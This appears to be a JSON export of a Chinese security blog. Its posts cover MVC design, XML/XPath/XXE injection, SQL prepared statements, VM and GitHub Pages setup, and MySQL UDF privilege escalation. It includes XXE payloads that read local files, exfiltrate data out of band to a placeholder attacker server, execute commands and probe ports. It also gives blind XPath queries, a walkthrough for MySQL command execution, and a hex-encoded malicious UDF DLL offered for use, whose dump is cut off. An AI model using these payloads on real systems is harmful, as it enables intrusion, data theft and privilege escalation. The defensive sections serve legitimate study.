[{"title":"MVC架构","path":"/2025/08/30/MVC架构/","content":"MVC架构 定义 MVC是一种软件架构模式，常用于图形化界面和 Web 应用的设计，全称是： M：Model(模型) V：View(视图) C：Controller(控制器) 它的核心思想就是：MVC通过职责分离和分层控制，把数据、显示、逻辑分开，让代码更清晰、好维护，是现代Web开发（如Spring MVC、ASP.NET MVC）的基石 组成部分 Model 负责存储、处理、管理数据（如数据库里的表、业务逻辑里的计算、数据库增删改查等等） 它不管怎么显示，只管数据正确不正确 包含内容： POJO/Bean/Domain：数据实体类，描述业务对象 Service：实现核心业务逻辑（如用户注册、订单处理） Dao（Data Access Object数据库访问对象）：负责数据持久化操作（如数据库增删改查） View 专门负责显示给用户看的内容（如网页界面、APP 界面、桌面程序的窗口） 它只关心怎么展示，而不关心数据是怎么来的 Controller 负责接收用户输入和请求（如点按钮、提交表单），然后告诉 Model 去处理数据，再把结果交给 View 来展示 举个用户注册的栗子： 用户请求：通过View（如HTML表单）提交注册信息 Controller接收：解析请求参数，调用Model层的UserService处理注册逻辑 Model处理： UserService校验数据，调用UserDao将数据存入数据库 返回处理结果（成功/失败）给Controller Controller响应：根据结果选择View（如跳转到成功页或错误页） View渲染：展示最终页面给用户 MVC架构和三层架构的关系 三层架构 三层架构作为一种分层架构模式，它将整个应用划分为三个清晰的层次 表现层（Presentation Layer）：直接与用户进行交互，例如各类 UI 界面（用户和软件/设备之间交互的界面） 业务逻辑层（Business Logic Layer）：专注于处理核心业务规则 数据访问层（Data Access Layer）：负责与数据库或外部数据源进行交互 主要区别 对比维度 MVC 架构模式 三层架构 设计目标 对用户界面的交互逻辑进行解耦 实现整个系统的分层解耦 适用范围 主要适用于用户界面相关场景 适用于整个应用程序 层次划分 包含 Model、View、Controller 三个角色 有表现层、业务逻辑层、数据访问层三个物理层 典型应用场景 常用于 Web 框架（如 Spring MVC、ASP.NET MVC） 适用于企业级应用的整体架构设计 联系互补 MVC 可作为三层架构表现层的实现方式：在三层架构的表现层中，可以运用 MVC 模式来进一步分解 UI 逻辑。例如，Controller 负责处理请求，View 负责渲染页面，而 Model 则对应业务逻辑层的接口。 三层架构的业务逻辑层和数据访问层可与 MVC 协同工作：MVC 中的 Model 并非必须完全独立，它可以调用三层架构中业务逻辑层的服务，而业务逻辑层又能调用数据访问层来获取数据。 共同达成高内聚、低耦合的目标：两者都借助分层或角色分离的方式，提升了代码的可维护性和可扩展性。 实际应用 在一个典型的web应用里： 表现层：采用 MVC 模式，其中 Controller 接收请求，View 负责渲染 HTML 页面，Model 调用业务逻辑层的接口。可以说我们学习的MVC模式对应的是三层架构的表现层 业务逻辑层：独立存在，处理诸如订单计算、权限验证等核心业务。 数据访问层：负责与数据库交互，执行数据的增删改查操作。 面试高频问题 Q1：MVC 和三层架构的区别是什么？ A：MVC 是一种设计模式，强调的是 用户交互流程；而三层架构是从 系统架构角度 划分的层次结构，两者结合后形成完整的 Web 应用结构。 Q2：为什么要在项目中使用 MVC？ A：为了实现 前后端分离、逻辑清晰、易于维护、提高开发效率。各层分工明确，便于多人协作开发。 Q3：Servlet （Server Applet，Java写的服务端小程序，用来处理浏览器和服务器之间的通信）在 MVC 中属于哪一层？JSP （Java Server Pages，是运行在服务器端的动态网页技术）呢？ A： Servlet 属于 Controller 层，用于接收请求和控制流程； JSP 属于 View 层，用于展示数据和页面渲染。 Q4：如果不用 MVC，会有什么问题？ A：会出现大量业务逻辑混杂在 JSP 页面中，导致代码难以维护、不易测试、安全性差等问题。 Q5：如何保证各层之间的低耦合（使各模块互不影响）？ A：通过接口编程、依赖注入等方式，使各层之间仅依赖接口而非具体实现类。 参考： MVC（Model-View-Controller）架构模式和三层架构介绍 MVC三层架构 | 柯基大大 图解【MVC开发模式】【三层架构】","tags":["软件架构","代码审计"],"categories":["软件架构","代码审计"]},{"title":"从XML到XXE","path":"/2025/08/29/从XML到XXE/","content":"从XML到XXE XML 什么是XML？ XML指可扩展标记语言（EXtensible Markup Language） XML的设计宗旨是传输数据，而不是显示数据 XML不会做任何事情，XML被设计用来结构化、存储以及传输信息 XML语言没有预定义的标签 XML 不是 HTML 的替代 XML被设计用来传输和存储数据，其焦点是数据的内容 HTML被设计用来显示数据，其焦点是数据的外观 HTML旨在显示信息，而XML旨在传输信息 XML语法结构 语法 XML元素都须有关闭标签 XML标签对大小写敏感 XML必须正确地嵌套 XML文档必须有根元素 XML的属性值须加引号 结构 XML文档声明，在文档的第一行 XML文档类型定义，即DTD，XXE 漏洞所在的地方 XML文档元素 DTD XML文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的 DTD用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用) DTD文档 1.内部DTD文档!DOCTYPE 根元素[定义内容]2.外部DTD文档!DOCTYPE 根元素 SYSTEM DTD文件路径3.内外部DTD文档结合!DOCTYPE 根元素 SYSTEM DTD文件路径 [定义内容] 实体引用 XML元素以形如 tagfoo/tag 的标签开始和结束，如果元素内部出现如 的特殊字符，解析就会失败，为了避免这种情况，XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用： lt; 小于号gt: 大于号amp; 和apos; 单引号quot; 双引号 DTD实体 实体是用于定义引用普通文本或特殊字符的快捷方式的变量 实体引用是对实体的引用 实体可在内部或外部进行声明 内部实体 !ENTITY 实体名称 实体的值例如：!DOCTYPE foo [ !ELEMENT foo ANY !ENTITY xxe hello]fooxxe;/foo 外部实体 有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，外部实体的引用可以利用如下协议file://文件绝对路径 如：file:///etc/passwdhttp://url/file.extphp://filter/read=convert.base64-encode/resource=xxx.php例如:!DOCTYPE foo [ !ELEMENT foo ANY !ENTITY % xxe SYSTEM http://xxx.xxx.xxx/evil.dtd %xxe;]fooevil;/foo外部evil.dtd中的内容!ENTITY evil SYSTEM “file:///etc/passwd” %xxe执行后会加载外部实体 evil.dtd 并执行，得到的结果会放在中 XML注入 什么是XML注入？ XML注入攻击和SQL注入攻击的原理类似，利用了XML解析机制的漏洞，如果系统对用户输入,没有做转义的处理，攻击者可以修改XML的数据格式，或者添加新的XML节点，就会导致解析XML异常，导致XML注入攻击 如何注入？ 如下XML是用于注册访问用户，其中用户名是由用户自己输入的 ?xml version=1.0 encoding=UTF-8 ?user role=guest用户输入/user 攻击者在输入用户的时候，可以构造 user1 /user user role=“admin”user2数据去拼接XML，之后整个XML字符串将会变成如下格式。这样就添加了一个管理员权限的用户 ?xml version=1.0 encoding=UTF-8 ?user role=guestuser1/useruser role=adminuser2/user 如何防御？ 使用安全的XML库 正确代码使用Dom4j来构建XML，Dom4j将会对文本数据进行XML编码，从而使得XML的原始结构和格式免受破坏，防止了XML注入 对用户输入的字段进行转码处理 使用实体编码对用户的输入进行转义 XPath注入 什么是XPath注入？ XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息 XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容 XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限 如何注入？ XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作 注入对象不是数据库users表，而是一个存储数据的XML文件。因为xpath不存在访问控制，所以不会遇到许多在SQL注入中经常遇到的访问限制。 注入出现的位置也就是cookie，headers，request parameters/input等 如果一个网站某应用程序将数据保存在XML中，并且对用户的输入没有做限制，攻击者提交了没有经过处理的输入，就插入到 XPath 查询中，即产生Xpath注入，那么就攻击者就可能通过控制查询，获取数据，或者删除数据之类的操作 Xpath是xml路径语言，用于配置文件的查找。数据库就是xml文件。因此只要是利用XPath语法的Web 应用程序如果未对输入的XPath查询做严格的处理都会存在XPath注入漏洞。比如一些登录地址页面，搜索页面需要与xml交互的位置 Xpath直接注入 示例： test.xml(存储用户名和密码) ?xml version=1.0 encoding=UTF-8?root users user id1/id usernametest1/username passwordtest1/password /user user id2/id usernametest2/username passwordtest2/password /user /users/root php(用于接收传入参数，并进行XML查询) ?php$xml=simplexml_load_file(test.xml);$name=$_GET[name];$pwd=$_GET[pwd];$query=/root/users/user[username/text()=.$name. and password/text()=.$pwd.];echo $query;$result=$xml-xpath($query);if($result) echo h2Welcome/h2; foreach($result as $key=$value) echo br /ID:.$value-id; echo br /Username:.$value-username; ? 使用simplexml_load_file()函数返回类 SimpleXMLElement 的一个对象（该对象的属性包含 XML 文档中的数据） 攻击者在username字段中构造恒真语句如' or 1=1 or ''='进行闭合，获取所有user数据 Xpath盲注 如果遍历出整个XML文档，一般步骤如下： 1.盲注根节点 利用count（/*）判断根下节点： ?name= or count(/*) = 1 or 1 = 2 有返回结果证明存在一个根节点 利用substring分割根节点的每个字符，猜解第一级节点： ?name= or substring(name(/*[position() = 1]),1,1)=r or 1=2?name= or substring(name(/*[position() = 1]),2,1)=o or 1=2 2.盲注root的下一级节点 判断root的下一级节点数： ?name= or count(/root/*) = 1 or 1 = 2 有返回结果证明存在一个root的下一级节点 猜解root的下一级节点： ?name= or substring(name(/root/*[position() = 1]),1,1)=u or 1=2?name= or substring(name(/root/*[position() = 1]),2,1)=s or 1=2 重复上述步骤，直至猜解出所有节点，最后来猜解节点中的数据或属性值 如何防御？ 限制提交非法字符，对输入内容严格检查过滤，参数化XPath查询的变量 XML外部实体注入（XXE） 什么是XXE？ XXE漏洞全称XML External Entity Injection 即XML外部实体注入 XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害 如何注入？ 与SQL相似，XXE漏洞也分为有回显和无回显 有回显，可以直接在页面中看到payload的执行结果或现象 无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件 读取任意文件 有回显 首先准备一个有XXE漏洞的文件，这里以php文件为例 示例代码： ?php$xml=simplexml_load_string($_GET[xml]);print_r((string)$xml);//有回显? payload: ?xml version=1.0 encoding=utf-8?!DOCTYPE xxe [!ELEMENT name ANY !ENTITY file SYSTEM file:///D://1.txt ]rootnamefile;/name/root 读取文件，需URL编码后执行 通过构造外部实体payload，在 xml 中 file ; 变成了外部文件1.txt中内容，导致敏感信息泄露 无回显 无回显的文件读取可以通过 blind XXE 方法加上外带数据通道（ooB）来提取数据，先使用php://filter协议获取目标文件的内容，然后将内容以http请求发送到攻击服务器来读取数据。虽无法直接查看文件内容，但我们可以使用易受攻击的服务器作为代理，在外部网络上执行扫描以及代码。即，当无回显情况时，可以将数据发送到远程服务器(攻击服务器) paylaod： ?xml version=1.0?!DOCTYPE test[!ENTITY % file SYSTEM php://filter/read=convert.base64-encode/resource=D:/1.txt!ENTITY % dtd SYSTEM http://xxx.xxx.xxx.xxx/evil.dtd%dtd;%send;] evil.dtd： !ENTITY % payload !ENTITY #x25; send SYSTEM http://xxx.xxx.xxx.xxx/?content=%file; %payload;//%号要进行实体编码成#x25 进行XXE攻击后，服务器会把文件内容发送到攻击者服务器(这里是ubantu的apache日志记录) ubantu查看apache日志记录命令： tail -f /var/log/apache2/access.log 本地抓包也可以看到Base64编码后的文件内容 拒绝服务攻击(Dos) 常见的XML炸弹：当XML解析器尝试解析该文件时，由于DTD的定义指数级展开，这个1K不到的文件会占用到3G的内存 ?xml version=1.0? !DOCTYPE lolz [!ENTITY lol lol!ENTITY lol2 lol;lol;lol;lol;lol;lol;lol;lol;lol;lol;!ENTITY lol3 lol2;lol2;lol2;lol2;lol2;lol2;lol2;lol2;lol2;lol2;!ENTITY lol4 lol3;lol3;lol3;lol3;lol3;lol3;lol3;lol3;lol3;lol3;!ENTITY lol5 lol4;lol4;lol4;lol4;lol4;lol4;lol4;lol4;lol4;lol4;!ENTITY lol6 lol5;lol5;lol5;lol5;lol5;lol5;lol5;lol5;lol5;lol5;!ENTITY lol7 lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;lol6;!ENTITY lol8 lol7;lol7;lol7;lol7;lol7;lol7;lol7;lol7;lol7;lol7;!ENTITY lol9 lol8;lol8;lol8;lol8;lol8;lol8;lol8;lol8;lol8;lol8;]lolzlol9;/lolz 原理：递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol9 实体含有 10^8 个 “lol” 字符串,最后再引用lol9 执行系统命令 在php环境下，xml命令执行需要php装有expect扩展，但该扩展默认没有安装，所以一般来说命令执行是比较难利用，但不排除 ?xml version=1.0 encoding=utf-8?!DOCTYPE xxe [!ELEMENT name ANY !ENTITY xxe SYSTEM expect://id ]rootnamexxe;/name/root 探测内网端口 ?xml version=1.0 encoding=utf-8?!DOCTYPE xxe [!ELEMENT name ANY !ENTITY xxe SYSTEM http://127.0.0.1:80 ]rootnamexxe;/name/root 如何防御？ 使用开发语言提供的禁用外部实体的方法 php: libxml_disable_entity_loader(true); java: DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python: from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的XML数据 过滤关键字：\\!DOCTYPE和\\!ENTITY，或者SYSTEM和PUBLIC 不允许XML中含有自己定义的DTD 参考： 从XML相关一步一步到XXE漏洞 XXE漏洞详解 XML注入攻击总结","tags":["漏洞","XML漏洞"],"categories":["漏洞"]},{"title":"预编译真的能完美防御SQL注入吗？？？","path":"/2025/08/24/SQL预编译/","content":"SQL预编译 本文章主要解决一个问题： 预编译真的能完美防御SQL注入吗？？？ sql注入是指攻击者拼接恶意SQL语句到接受外部参数的动态SQL查询中，程序本身未对插入的SQL语句进行过滤，导致SQL语句直接被服务端执行 对于如此危险的漏洞，有没有办法进行阻止呢？ 有的兄弟，有的！ 预编译就能解决大部分的SQL注入问题 何为预编译？ 预编译全称Prepared Statement，就是在执行SQL前，把SQL语句告诉数据库服务器，编译好结构，然后再单独传参数进去执行 普通的拼接SQL： username = input(请输入用户名：)sql = SELECT * FROM users WHERE username = + username + cursor.execute(sql) 这就好像直接把“用户输入”和“SQL语句”拼成一整句话。 用户只要输入了奇怪的东西，就能控制整个 SQL 的逻辑！ 使用预编译： username = input(请输入用户名：)sql = SELECT * FROM users WHERE username = ?cursor.execute(sql, (username,)) SQL 写的时候，用占位符（?）或命名参数（:name）， 参数是后面传进去的！不是拼进去的！ 预编译的执行流程 发送 SQL 模板给数据库服务器 比如： SELECT * FROM users WHERE username = ? 这个时候数据库就把这个 SQL 的结构编译好了，生成了“执行计划” 服务器把这个语句存起来 存的是“只差参数”的 SQL 模板 客户端发送参数 比如： (admin,) 数据库执行之前编译好的 SQL 把你传进去的参数当成“纯数据”，直接放进语句执行！ 为什么这样能防止 SQL 注入？ 因为参数永远只是值，不会被当作 SQL 代码执行！ 哪怕用户输入的是： OR 1=1 数据库也会当成一个完整的字符串 ' OR '1'='1 来处理，它不会让它改变 SQL 语句的逻辑结构 但是，重点来了，预编译真的能完美防御SQL注入吗？ 预编译之外的注入 刚刚提到，预编译是将sql语句参数化，刚刚的例子中 where语句中的内容是被参数化的。这就是说，预编译仅仅只能防御住可参数化位置的sql注入。那么，对于不可参数化的位置，预编译将没有任何办法 不可参数化的位置： 表名、列名 order by、group by limit join 我们以order by举例，现在有一个sql语句如下（以下为伪代码） SELECT * FROM users ORDER BY user_input; 其中user_input是传递过来的参数，例如 id SELECT * FROM users ORDER BY id; 这个语句是正确的，但是如果user_input输入 id;drop table users -- SELECT * FROM users ORDER BY id;drop table users -- 这样就被成功注入了，而这种位置是不可被参数化的，所以是无法通过预编译防御的 order by后一般是接字段名，而字段名是不能带引号的，比如 order by username;如果带上引号成了order by 'username'，那username就是一个字符串不是字段名了，这就产生了语法错误。 所以order by后不能参数化的本质是：一方面预编译又只有自动加引号的setString()方法，没有不加引号的方法；而另一方面order by后接的字段名不能有引号 如何防御 对于sql注入存在两种情况，可参数化的，不可参数化的 对于可参数化没商量，直接预编译解决一切。 而对于不可参数化的，只能通过设置白名单，过滤特殊符号，通过加引号强制转为字符串等方式进行拦截 参考： 预编译真的能完美防御SQL注入吗？ SQL预编译——预编译真的能完美防御SQL注入吗 浅谈预编译之于SQL注入防御","tags":["漏洞","SQL"],"categories":["漏洞"]},{"title":"解决Ubuntu与Windows间无法复制粘贴问题","path":"/2025/08/12/解决Ubuntu与Windows间无法复制粘贴问题/","content":"解决Ubuntu与Windows间无法复制粘贴问题 open-vm-tools 是在 VMware 虚拟机中提供与宿主机交互的工具包，比如： 自动调整虚拟机分辨率 文件夹共享 剪贴板共享（宿主机与虚拟机之间） 性能优化等 直接在ubuntu命令行执行以下命令 sudo apt-get autoremove open-vm-tools //卸载已有的工具sudo apt-get install open-vm-tools //安装工具open-vm-toolssudo apt-get install open-vm-tools-desktop //安装open-vm-tools-desktop 之后重启即可： sudo reboot","tags":["虚拟机","ubuntu"],"categories":["ubuntu"]},{"title":"Github Pages绑定域名","path":"/2025/08/12/Github-Pages绑定域名/","content":"Github Pages绑定域名 不经历撕心裂肺的痛苦与筋疲力尽的挣扎，怎能破茧成蝶，实现涅槃重生？ 域名注册 进入阿里云官网，先到域名注册页面购买自己心仪的域名 新用户需要进行实名认证，在订单详情页有相关提示进行认证即可，一般10分钟内可审核通过，实名认证成功后，可直接购买域名，选择支付宝支付即可 域名解析 当域名状态显示为 正常 时，开始进行 域名解析，点击右侧操作中的 解析设置 进入云解析 DNS 页面 点击添加记录，添加一条 A 记录和一条 CNAME 记录，填写如下： 附1：主机记录说明 附2：记录类型 特别注意A记录时将域名指向一个IPv4地址，其记录值选择github官方IP： 185.199.108.153185.199.109.153185.199.110.153185.199.111.153 上面4个随便选一个即可 域名绑定 先Github 仓库的 CNAME 文件中新增一条指令： 前往Github Page已搭建好的仓库中，点击settings→ page→Custom domain 项中添加进行解析后的自定义域名→ 勾选 Enforce HTTPS 这样Github Pages就绑定域名了 你以为这样就好了吗😛。。。。。。 实则不然，你会遇到每次使用hexo deploy部署之后，github page的custom domian自定义域名就会失效 这时，只需在hexo项目的source文件夹下新建CNAME文件，里面填入你的域名，并保存，这样每次hexo deploy后，github page就不会出现域名重置了","tags":["博客美化"],"categories":["博客美化"]},{"title":"MySQL UDF提权","path":"/2025/08/08/MySQL UDF提权/","content":"本文解析Windows环境下的MySQL UDF提权 MySQL UDF提权 Windows环境下 概述 有时候我们通过一些方式获取了目标主机mysql的用户名和密码，并且可以远程连接，我们远程登录上mysql服务器，这时，我们想通过mysql来执行系统命令，此时我们可以考虑UDF进行提权 UDF（User Defined Function）：用户自定义函数，其为MySQL的一个拓展接口，可以使用UDF为MySQL增添一些函数 前提条件 获取mysql控制权限：知道mysql用户名和密码，并且可以远程登录（即获取了mysql数据库的权限） mysql具有写入文件的权限：mysql有写入文件的权限，即secure_file_priv的值为空 mysql提权获取到的权限大小跟运行mysql所在服务器登录的账号的权限相关，如操作系统以普通用户登录的并启动mysql，经udf提权后也只能获取到系统的普通用户权限。而使用管理员登录操作系统运行mysql，提权后获取的权限则为系统管理员权限 手工提权 查看MySQL是否有写入文件的权限 mysql show global variables like %secure%;+--------------------------+-------+| Variable_name | Value |+--------------------------+-------+| require_secure_transport | OFF || secure_auth | ON || secure_file_priv | |+--------------------------+-------+3 rows in set, 1 warning (0.00 sec) secure_file_priv是用来限制load dumpfile、into outfile、load_file()函数在哪个目录下拥有上传和读取文件的权限。如下关于secure_file_priv的配置介绍 当secure_file_priv的值为null，表示限制mysqld 不允许导入|导出 当secure_file_priv的值为/tmp/，表示限制mysqld 的导入|导出只能发生在/tmp/目录下 当secure_file_priv没有具体值时，表示不对mysqld 的导入|导出做限制 如果secure_file_priv的值不是为空，我们可以在mysql/my.ini中查看是否有secure_file_priv 的参数，如果没有的话我们就添加 secure_file_priv = ' ' 写入动态链接库 动态链接库就是实现共享函数库概念的一种方式，在Windows环境下后缀名为.dll，在linux环境下后缀名为.so，我们要将该文件放在特定的目录中，该文件中包含了执行系统命令的一些函数 版本 路径 MySQL 5.0 导出路径随意； 5.0 = MySQL= 5.1 需要导出至目标服务器的系统目录（如：c:/windows/system32/或c:/windows） MySQL 5.1 必须导出到MySQL安装目录下的lib\\plugin文件夹下 查看版本 mysql select version();+-----------+| version() |+-----------+| 5.7.26 |+-----------+1 row in set (0.00 sec) 查看plugin所在目录 mysql show variables like %plugin%;+-------------------------------+----------------------------------------------------+| Variable_name | Value |+-------------------------------+----------------------------------------------------+| default_authentication_plugin | mysql_native_password || plugin_dir | D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\ |+-------------------------------+----------------------------------------------------+2 rows in set, 1 warning (0.01 sec) 虽然plugin目录不存在但是这里会显示出来 我这边版本大于5.7.26，所以放在/lib/plugin下，但需要手动创建，网上说可以结合ntfs特性实现用MySQL创建文件夹，但是我这边尝试失败，为了实验需要，我自己创建一个plugin文件夹 查看系统架构 mysql show variables like %compile%;+-------------------------+--------+| Variable_name | Value |+-------------------------+--------+| version_compile_machine | x86_64 || version_compile_os | Win64 |+-------------------------+--------+2 rows in set, 1 warning (0.00 sec) 如上显示mysql是64位，操作系统是x86_64 这里我们上传64位的dll文件 直接写入16进制数据： MySQL UDF提权16进制查询 | Ziekun 创建自定义函数 上传之后，使用如下命令创建自定义函数 create function sys_eval returns string soname udf.dll; 只有两个变量： 一个是函数名，我们引入的函数是 sys_eval 一个是共享包名称，即 udf.dll 注意：自定义函数并不是随便命名的，其名称要dll文件中我们自定义函数名称一样 然后使用命令查看是否新增sys_eval函数 mysql select * from mysql.func;+----------+-----+---------+----------+| name | ret | dl | type |+----------+-----+---------+----------+| sys_eval | 0 | udf.dll | function |+----------+-----+---------+----------+1 row in set (0.00 sec) 执行系统命令 mysql select sys_eval(whoami);+----------------------+| sys_eval(whoami) |+----------------------+| laptop-fiogpvd7\\asus |+----------------------+1 row in set (0.62 sec) 删除自定义函数 drop function sys_eval; UDF shell 假设目标 MySQL 在内网情况下，无法直连 MySQL 或者 MySQL 不允许外连，这个时候一些网页脚本就比较方便好用了 t00ls UDF.PHP 简单方便，一键 DUMP UDF 和函数，操作门槛降低了很多 使用时将udf.php放在WWW目录下，访问127.0.0.1/udf.php，登录后： 也可以用Navicat MySQL 中文字符编码问题 在中文Windows系统环境下，cmd.exe默认使用GBK字符集进行输入输出处理，这意味着： 从数据库传递给cmd的命令参数必须是GBK编码 cmd执行结果的输出也是GBK编码 如果字符集不匹配，就会出现乱码或命令执行失败 输出结果编码错误 在中文Windows环境下MySQL UDF提权中，最常见的问题是执行结果的编码问题： select sys_eval(dir F:\\\\); 对应的解决办法很简单，udf函数外加一层编码转化的函数 select convert(sys_eval(dir F:\\\\) using gbk); 命令中非ASCII字符处理 当命令参数包含中文，由于MySQL输入会根据默认字符集(utf8mb4/latin1)编码对应的命令进入命令行解释器 select convert(sys_eval(dir F:\\\\黑子) using gbk); 发现中文消失不见了，如何解决呢？ 16进制编码 使用CyberChef将命令转换为对应编码的十六进制 然后使用十六进制替代原有的字符串，防止MySQL因为默认编码问题导致的含有中文命令执行错误问题 注意：16进制编码时不用多加个\\进行转义 select convert(sys_eval(0x64697220463a5cbadad7d3) using gbk); 编码函数 既然又是编码问题，那再次使用MySQL的编码转化的函数不就好了吗？何必转成16进制这么麻烦 select convert(sys_eval(convert(dir F:\\\\黑子 using gbk)) using gbk); 参考： Mysql之UDF提权 | 白泽 MySQL UDF提权执行系统命令 | 白泽 MySQL 漏洞利用与提权 | 国光 Sql注入-Windows下利用udf提权 利用MySQL UDF进行的一次渗透测试 数据库提权中的字符集挑战 | Wells","tags":["MySQL","提权","UDF"],"categories":["MySQL","提权"]},{"title":"MySQL UDF提权16进制查询","path":"/2025/08/06/MySQL-UDF提权16进制查询/","content":"本文提供UDF提权中dll文件查询使用 MySQL UDF提权16进制查询 WindowsLinuxlib_mysqludf_sys_32.dll SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a24000000000000004d477bd0092615830926158309261583005e86830b261583005e808308261583005e968307261583005e91830b2615832ee06e830a2615830926148325261583005e9c8308261583005e878308261583005e8483082615835269636809261583000000000000000000000000000000000000000000000000504500004c0103004afe9f5a0000000000000000e00002210b010900001000000010000000600000607c0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007c83000008020000b4820000c800000000800000b402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002c7e00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000e0555058310000000000100000007000000010000000040000000000000000000000000000400000e02e7273726300000000100000008000000006000000140000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d090208b92bcf11b11ceea24f550000560c000000220000260000a8ffffffff8b4c240833c03901741656578b7c24146a0c59be000010dcf3a566a55fb0015e5dfb77fbc38b44240c1a6a071611108bf8183218ff63db6f1ca45fc7011e1200210883380175128b40040df6776f0700750a1004c6000132c0c3530abf1df68d3c3053a454082d08ff30ff15fff6ee776c885985c075085614c601011bc8568d71018a11fd6fdffe4184d275f98b54142bce890a32558bec8b4d0c833902b7d860bf5374148b7d10915c5453eb4cbf9dbddf8b417d740f1b707c1bebe5836004dbb1ffb7001a0c8b48048b008d4401025072a0594c08dfc8d7b5891678113006a44ceb6c57beb7b2b85f5e5da30421740833dbb63ff6a8591353568b742410d878534602db85db5bb6460851c78d5c4257e8240b75eeeebfe01400c604070008ff70041e0553b1db1b921a22c418535720030054090f09b7086a995b0f98599954cf2d343713b8f4540b1edeb60d818403552251519d35dffed6fedf576800f762d66a018945fc068bf08b4560dd7ff70cc606004533ff595939387471683cc071c6fedfda9c12260c3bc7745b506a04ff75fc149073e1edd7a9fd48533afc8d48911040b963dbff2bc18bd88d043b505630f8268c5330d8ad8dbd5f03fe570e940de57df8463fe6364c2066ba5b1810a4803e0059169eb0ff741a8bc6c64437ff00594d1489c906987bebd86f183e5f205ec9c3eed7b235dcbaf37d574708c45030087bdbdacdc9c26a4078c710548d4601b9e07e614251724f0856ff31cf6bafdd9db694c66aff8dc32082f63a58b0b6030d092c23005f7cc36e57036c6a081d1290ac0aa88365fc2f6c2f2c2d4592d0eb071b408f65e8c70bbfd66e42feff000d1fedc25e3bffdb17b60d08209a02f3c3e90806f58bff56688000002d8c6d675880985608845aa3bde0febb062358045485f675054daa83260076fbb7db4508c36f08ed09acc704240607ff0b4c113637598d71ffcf9c0bbf77dfc9750e39056b107e3cff7310830b01fbeec6bb8b0910548b098f57890a23480f85d47d618cbbad641718068b79040838071b76edeebb1e50eb184aa705b8e61768b0b030d8e803a83c0957c1d6bbaeb5d6a1e7e9e2573ca12f4c6a6ff777c3025efd096a1fee76eb3caa10c80475ed7befc0c7051f281a70e027071bdff79d5cb520bc04b81b6a5635b952eb782b7339b2e3696ff7defd7340393d155c741c68062809ac43db6b85850d9e1034252316ffe666f862f154b201dc0801592cc2b1a1db78049ddfdbf62413d90fd4fc83f80266b16f6cb0d2595bffa0584b77783bb5783106350f8487c71996ee4cd3543bf81810897d82efc796be35fac87251833f8af36a7c398587b4f10774e9ffc8d60f7c89c5db9bb5d955f85615441b474ded5be38ef88a394d1003d00874b48909437aa36d020c1ad3f8eba71c3162cc5a64442e386161fb0a58064c32fc19503f1bdf720443375bc9c20cc710fb02231fb2288b2ef28b5d081cae0fdb9b54e433c95cfc7d2008016c2dc6c23bf15a393a4417e4d61bfe7fafae3bf0740583fe02752e1910d03bc1e7166eb8ed57565fd03b5ee40003937b703b67115a039614168012376c7d270a8227fea0246420575062b30d661327002f527f8df61ad2061153f76a037543b067bb614f34032168742e2c0d2c3cec257feb1b71ec5a09706a7c6faae05051597c64825d900eadf62ffa8a19066b8f91b6c72ae490c396ec1640e134a9ff3b246abb41c1f17926547dbc550c0d381e33bc05bc595d382281ec2832f7869f365f212043211c895e2118891d05f78ec243143c21a2aa210c668c186c5ffbda3806252c0620080605dd2dcdd20425002d7ffc9c8f7ab6b1f6143095562407042831d6fedb7f0807348b85e0fca0aa701ddbb5b395011c1920241318092b18476a565f201cb360c32c9f7b8985d8320a04dc03b557e01b243468dedfd1f7d8d360ce2879d40a2c833d208dbdc3da00f923685b1b300bdfaf67f534c97f23401ec25f6a4849918f144a50152e9df458aaf8a29c10f3eb67611c7e052c37d4598feded8321b9273551e0f5ee3bdc0abf03e4507f4b8417185bdb7e600bce1cdc142cd6e288b154b609e01b14f413160a4bdb313ddcdbffdc84676cc859d94e1e07f7d81bf076bbb7c00359485d1656b8bc18be04a3638b6f2af83bc673080753025073d85f60835a3bfe72f15f5e25206c6053c820cc006f35b